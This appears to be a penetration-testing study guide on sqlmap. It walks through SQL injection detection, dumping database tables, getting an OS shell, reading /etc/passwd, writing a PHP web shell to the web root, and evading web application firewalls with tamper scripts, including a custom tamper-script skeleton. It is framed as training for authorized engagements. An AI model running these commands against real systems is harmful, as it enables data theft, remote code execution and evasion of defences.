# sqlmap — Complete Usage Guide & WAF Bypass

> sqlmap automates everything covered in files 01–04 (detection + extraction). This file
> assumes you already understand *why* the underlying techniques work — sqlmap is the
> automation layer, not a replacement for that understanding. On a real engagement and on
> the exam, you must be able to explain what sqlmap is doing under the hood.

---

## 1. Basic Detection & Confirmation

```bash
# Simplest case — test a GET parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the exact parameter to test (when there are multiple)
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# POST request body
sqlmap -u "http://target.com/login" --data "username=admin&password=test"

# From a raw Burp request file (best practice — preserves headers/cookies exactly)
sqlmap -r request.txt
```

**Getting the raw request file from Burp:** right-click the request in Proxy/Repeater →
"Copy to file" or "Save item" → pass that file with `-r`. This is the cleanest way to run
sqlmap because it preserves cookies, auth headers, and content-type exactly as the
browser sent them — manually rebuilding the request is error-prone and a common reason
sqlmap "doesn't find" an injection that actually exists.

---

## 2. Specifying Injection Technique & Risk/Level

```bash
--technique=BEUSTQ
# B = Boolean blind, E = Error-based, U = Union, S = Stacked queries, T = Time-based, Q = Inline queries

--level=5     # 1-5, higher = tests more injection points (headers, cookies, etc.)
--risk=3      # 1-3, higher = tries riskier payloads (e.g. heavy queries, OR-based)
```
Default level/risk (1/1) misses a lot — bump to `--level=3 --risk=2` minimum on a real
assessment once you've confirmed the target can handle the load, and go higher only if
needed.

---

## 3. Database Enumeration Workflow

```bash
--dbs                       # list all databases
-D dbname --tables          # list tables in a specific database
-D dbname -T users --columns  # list columns in a specific table
-D dbname -T users -C username,password --dump   # dump specific columns
--dump-all                  # dump everything (use carefully — huge on real targets)
--exclude-sysdbs            # skip system databases when dumping --dbs/--dump-all
```

```bash
# Get current user, current DB, DB version in one go
sqlmap -u "http://target.com/page?id=1" --current-user --current-db --banner
```

---

## 4. Handling Sessions / Auth-Protected Pages

```bash
--cookie="PHPSESSID=abc123"
--auth-type=Basic --auth-cred="user:pass"

# Maintain login session via a login sequence
sqlmap -u "http://target.com/page?id=1" --cookie="session=xyz" --csrf-token=csrf_token_name
```
If the app uses CSRF tokens that rotate per request, use `--csrf-token` so sqlmap
fetches a fresh token before each request instead of reusing a stale one.

---

## 5. Going Beyond Extraction — OS-Level Access

```bash
--os-shell        # attempt to get an interactive OS shell (needs FILE privilege + writable web dir)
--os-cmd="whoami" # run a single OS command
--sql-shell       # interactive SQL shell once injection is confirmed
--file-read="/etc/passwd"
--file-write="shell.php" --file-dest="/var/www/html/shell.php"
```
These require specific conditions: stacked query support, DB user with `FILE` privilege
(MySQL) or `xp_cmdshell` enabled (MSSQL), and a known/writable web root path. This is
where SQLi turns into full RCE — see file `07_Advanced_Topics.md` for the manual version
of this without sqlmap.

---

## 6. sqlmap WAF/IDS Detection & Bypass

### 6.1 Detecting a WAF first
```bash
--identify-waf
```
Tells you which WAF (if any) is in front of the target — this should always be your
first move before trying tamper scripts blindly.

### 6.2 The `--tamper` Flag

Tamper scripts rewrite the payload before sending it, to dodge signature-based filters.
You can chain multiple:
```bash
--tamper=space2comment,charencode,between
```

| Tamper script | What it does |
|---|---|
| `space2comment` | Replaces spaces with `/**/` |
| `space2plus` | Replaces spaces with `+` |
| `charencode` | URL-encodes the whole payload |
| `charunicodeencode` | Unicode-encodes the payload |
| `between` | Replaces `>`/`<` with `NOT BETWEEN` constructs |
| `randomcase` | Randomizes keyword casing (`UnIoN SeLeCt`) |
| `apostrophemask` | Replaces `'` with UTF-8 fullwidth equivalent |
| `apostrophenullencode` | Replaces `'` with illegal double-byte sequence the DB still parses |
| `equaltolike` | Replaces `=` with `LIKE` |
| `greatest` | Replaces `>` with `GREATEST()` calls |
| `modsecversioned` | Wraps payload in versioned MySQL comment to dodge ModSecurity-specific signatures |
| `multiplespaces` | Adds multiple spaces around keywords |
| `unionalltounion` | Replaces `UNION ALL SELECT` with `UNION SELECT` |
| `versionedkeywords` | Wraps keywords in MySQL version-comment syntax `/*!50000UNION*/` |

### 6.3 Practical Bypass Workflow
```bash
sqlmap -u "http://target.com/page?id=1" --identify-waf
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode --random-agent
```
- `--random-agent` rotates User-Agent strings — useful against WAFs that fingerprint/
  block sqlmap's default UA.
- `--delay=2` and `--randomize` (randomizes a specified parameter value) help avoid
  rate-limit-based WAF triggers.
- `--proxy` routes traffic through Burp so you can watch exactly what sqlmap is sending
  and manually tweak from there if automated tamper combos still get blocked.

### 6.4 Writing a Custom Tamper Script
When built-in tamper scripts aren't enough, you can write your own Python tamper script
(sqlmap loads from `sqlmap/tamper/`). A minimal skeleton:
```python
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    return payload.replace(" ", "/**/")
```
On real engagements, custom tamper scripts are common when the target WAF has unusual,
non-default rules — generic public tamper scripts are well-known to most commercial WAF
vendors and increasingly get specifically blocked.

---

## 7. Performance & Stealth Flags Worth Knowing

```bash
--batch              # never ask for input, use defaults (good for automation/CI)
--threads=5           # parallel requests (be careful — can trip rate limiting/WAF)
--delay=1             # seconds between requests
--timeout=30          # per-request timeout
--retries=3           # retry on connection failure
--tor                 # route through Tor (rarely appropriate on authorized engagements — know your scope/rules)
--flush-session       # clear cached session data, force a fresh re-test
```

---

## 8. Real-World Notes
- sqlmap output should never go straight into a report — always re-verify a critical
  finding (e.g. a dumped password hash) manually with Repeater so you can show a clean,
  minimal reproduction step instead of a wall of sqlmap automation noise.
- On client engagements with strict scope/rate limits, `--batch --threads=1 --delay=1`
  with explicit `--technique` flags is safer than letting sqlmap run wild with default
  settings — uncontrolled sqlmap runs are a common cause of accidentally degrading a
  client's production service.
- Always check `--identify-waf` before spending time on payload crafting — if there's no
  WAF, all that tamper-script effort is wasted time you could spend enumerating instead.
- sqlmap logs every request/response pair in its session file — useful for evidence in
  your final report, but also means you should clean up sensitive dumped data from your
  local sqlmap output directory after the engagement per data handling policy.

---

## 9. Where sqlmap Fits in Your Overall Methodology

```
Manual confirmation (file 02 techniques)
        │
        ▼
sqlmap with --technique narrowed to what you confirmed manually
        │
        ▼
Enumerate DBs → tables → columns → dump
        │
        ▼
If conditions allow: --os-shell / --file-read / --file-write
        │
        ▼
Manually re-verify critical findings in Burp before reporting
```

Continue to → `08_Advanced_Topics_Stacked_RCE_AuthBypass.md`
